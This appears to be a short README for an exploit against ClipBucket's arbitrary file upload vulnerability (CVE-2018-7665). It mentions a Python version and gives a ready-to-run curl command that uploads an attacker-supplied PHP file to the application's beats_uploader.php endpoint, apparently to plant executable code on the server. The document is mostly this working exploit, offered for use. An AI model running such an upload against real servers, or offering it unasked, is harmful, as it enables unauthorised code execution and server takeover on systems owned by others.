# ClipBucket - Arbitrary File Upload (CVE-2018-7665) / Python Version 🐍❤ 
--
You can also exploit this vulnerability with Curl:
```bash
curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php" "http://$HOST/actions/beats_uploader.php"
```
